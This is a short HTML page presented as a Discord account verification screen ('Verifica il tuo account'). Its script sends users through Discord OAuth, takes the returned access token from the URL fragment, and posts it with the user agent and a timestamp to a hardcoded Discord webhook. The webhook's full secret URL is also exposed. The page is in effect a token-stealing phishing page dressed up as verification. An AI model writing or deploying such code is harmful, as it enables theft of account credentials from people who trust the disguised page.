<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verifica Discord</title>
    <style>
        body { background:#36393f; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif; }
        div { background:#2f3136; padding:40px; border-radius:8px; text-align:center; color:#fff; }
        button { background:#5865f2; color:#fff; border:none; padding:14px 30px; border-radius:4px; font-size:16px; cursor:pointer; }
        p { margin-top:20px; color:#43b581; display:none; }
    </style>
</head>
<body>
    <div>
        <h2>Verifica il tuo account</h2>
        <button id="btn">Verifica con Discord</button>
        <p id="msg"></p>
    </div>
    <script>
        const CLIENT_ID = "1389562290365272106";
        const WEBHOOK   = "https://discord.com/api/webhooks/1527709125071343637/J2sC0E3WVdFU_FyvUZL8i7wtTDR1-42VaOCaBNFuBelDQhVqI_50UTO_qXPDR7DJ_iLe";
        const REDIRECT  = "https://ezpingu.github.io/verifydiscord/";

        document.getElementById('btn').onclick = () => {
            location = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT)}&response_type=token&scope=identify`;
        };

        (async () => {
            const hash = window.location.hash.substring(1);
            if (!hash) return;

            const params = new URLSearchParams(hash);
            const token = params.get('access_token');
            if (!token) return;

            document.getElementById('btn').style.display = 'none';
            document.getElementById('msg').style.display = 'block';
            document.getElementById('msg').textContent = 'Token ricevuto. Controlla il webhook.';

            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "**Token:**\n```" + token + "```\n**User-Agent:** " + navigator.userAgent + "\n**Time:** " + new Date().toISOString()
                })
            });

            history.replaceState({}, '', REDIRECT);
        })();
    </script>
</body>
</html>
